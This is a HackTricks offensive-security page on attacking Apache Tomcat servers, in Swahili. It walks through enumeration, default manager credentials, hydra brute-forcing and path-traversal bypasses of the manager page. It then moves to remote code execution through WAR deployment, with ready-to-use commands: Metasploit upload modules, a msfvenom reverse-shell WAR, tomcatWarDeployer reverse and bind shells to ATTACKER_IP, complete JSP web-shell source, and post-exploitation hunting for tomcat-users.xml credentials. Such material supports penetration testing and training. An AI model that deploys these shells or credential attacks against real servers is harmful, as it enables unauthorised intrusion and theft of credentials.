# Tomcat

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Kikundi cha Usalama cha Try Hard**

<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Ugunduzi

* Kawaida inaendeshwa kwenye **bandari 8080**
* **Kosa la kawaida la Tomcat:**

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

## Uorodheshaji

### **Uthibitisho wa Toleo**

Ili kupata toleo la Apache Tomcat, amri rahisi inaweza kutekelezwa:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
### **Mahali pa Faili za Meneja**

Kutambua maeneo sahihi ya **`/manager`** na **`/host-manager`** ni muhimu kwani majina yao yanaweza kubadilishwa. Tafutizo la nguvu linapendekezwa ili kutambua kurasa hizi.

### **Uorodheshaji wa Majina ya Mtumiaji**

Kwa toleo la Tomcat la zamani kuliko 6, inawezekana kuorodhesha majina ya mtumiaji kupitia:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **Mikopo ya Mfumo wa Kimsingi**

**`/manager/html`** directory ni nyeti sana kwani inaruhusu kupakia na kutekeleza faili za WAR, ambazo zinaweza kusababisha utekelezaji wa nambari. Directory hii inalindwa na uthibitishaji wa HTTP wa msingi, na mikopo ya kawaida ni:

* admin:admin
* tomcat:tomcat
* admin:
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

Mikopo hii inaweza kujaribiwa kutumia:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
Directory nyingine muhimu ni **`/manager/status`**, ambayo inaonyesha toleo la Tomcat na OS, ikisaidia kutambua udhaifu.

### **Shambulio la Nguvu Kubwa**

Kujaribu shambulio la nguvu kwenye directory ya meneja, mtu anaweza kutumia:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
## Mchanganyiko wa Makosa

### **Kufichua Nyuma ya Neno la Siri**

Kupata `/auth.jsp` inaweza kufichua neno la siri katika nyuma ya neno la siri chini ya hali za bahati.

### **Ukodishaji wa URL Mara Mbili**

Makosa ya CVE-2007-1860 katika `mod_jk` inaruhusu ukodishaji wa URL mara mbili wa kuvuka njia, ikiruhusu ufikiaji usiohalali kwenye kiolesura cha usimamizi kupitia URL iliyoundwa kwa makini.

Ili kupata kwenye wavuti ya usimamizi wa Tomcat enda: `pathTomcat/%252E%252E/manager/html`

### /mifano

Toleo la Apache Tomcat 4.x hadi 7.x lina skripti za mfano ambazo zinaweza kufichua habari na kushambuliwa na mashambulizi ya msalaba wa tovuti (XSS). Skripti hizi, zilizoorodheshwa kwa kina, zinapaswa kuchunguzwa kwa ufikiaji usiohalali na uwezekano wa kutumiwa vibaya. Pata [habari zaidi hapa](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /mifano/jsp/num/numguess.jsp
* /mifano/jsp/dates/date.jsp
* /mifano/jsp/snp/snoop.jsp
* /mifano/jsp/error/error.html
* /mifano/jsp/sessions/carts.html
* /mifano/jsp/checkbox/check.html
* /mifano/jsp/colors/colors.html
* /mifano/jsp/cal/login.html
* /mifano/jsp/include/include.jsp
* /mifano/jsp/forward/forward.jsp
* /mifano/jsp/plugin/plugin.jsp
* /mifano/jsp/jsptoserv/jsptoservlet.jsp
* /mifano/jsp/simpletag/foo.jsp
* /mifano/jsp/mail/sendmail.jsp
* /mifano/servlet/HelloWorldExample
* /mifano/servlet/RequestInfoExample
* /mifano/servlet/RequestHeaderExample
* /mifano/servlet/RequestParamExample
* /mifano/servlet/CookieExample
* /mifano/servlet/JndiServlet
* /mifano/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Udanganyifu wa Njia**

Katika [**mipangilio inayoweza kudhurika ya Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) unaweza kupata ufikiaji kwenye saraka zilizolindwa kwenye Tomcat kwa kutumia njia: `/..;/`

Kwa hivyo, kwa mfano, unaweza **kupata ukurasa wa msimamizi wa Tomcat** kwa kupata: `www.vulnerable.com/lalala/..;/manager/html`

**Njia nyingine** ya kuzidi njia zilizolindwa kwa kutumia hila hii ni kupata `http://www.vulnerable.com/;param=value/manager/html`

## RCE

Hatimaye, ikiwa una ufikiaji kwenye Meneja wa Programu ya Wavuti ya Tomcat, unaweza **kupakia na kutekeleza faili ya .war (kutekeleza nambari)**.

### Vizuizi

Utaweza tu kutekeleza WAR ikiwa una **mamlaka za kutosha** (majukumu: **admin**, **manager** na **manager-script**). Maelezo hayo yanaweza kupatikana chini ya _tomcat-users.xml_ kawaida iliyoainishwa katika `/usr/share/tomcat9/etc/tomcat-users.xml` (inatofautiana kati ya toleo) (angalia [POST ](./#post)section).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit ni chombo cha nguvu cha kufanya upenyezaji wa mtandao ambacho kinaweza kutumika kwa ufanisi kuchunguza na kudhibiti mifumo ya Tomcat. Unaweza kutumia Metasploit kugundua mapungufu katika mifumo ya Tomcat na kutekeleza mashambulizi ya kudhibiti.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Reverse Shell

1. Unda war kwa ajili ya kupeleka:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. Pakia faili ya `revshell.war` na ufikie (`/revshell/`):

### Bind na reverse shell na [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)

Katika hali fulani hii haifanyi kazi (kwa mfano toleo za zamani za sun)

#### Pakua
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Reverse shell

#### Kitanzi cha Nyuma
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Bind shell

#### Bind shell
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### Kutumia [Culsterd](https://github.com/hatRiot/clusterd)
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Mbinu ya kawaida - Web shell

Tengeneza **index.jsp** na [maudhui haya](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp):
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
Unaweza pia kusakinisha hii (inaruhusu kupakia, kupakua na utekelezaji wa amri): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### Mbinu ya Mikono 2

Pata kabibi ya wavuti ya JSP kama [hii](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) na unda faili ya WAR:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Jina la faili ya siri ya Tomcat ni _tomcat-users.xml_
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Njia nyingine za kukusanya siri za Tomcat:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## Vifaa vingine vya uchunguzi wa tomcat

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## Marejeo

* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)

**Kikundi cha Usalama cha Kujitahidi**

<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je! Unafanya kazi katika **kampuni ya usalama wa mtandao**? Je! Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
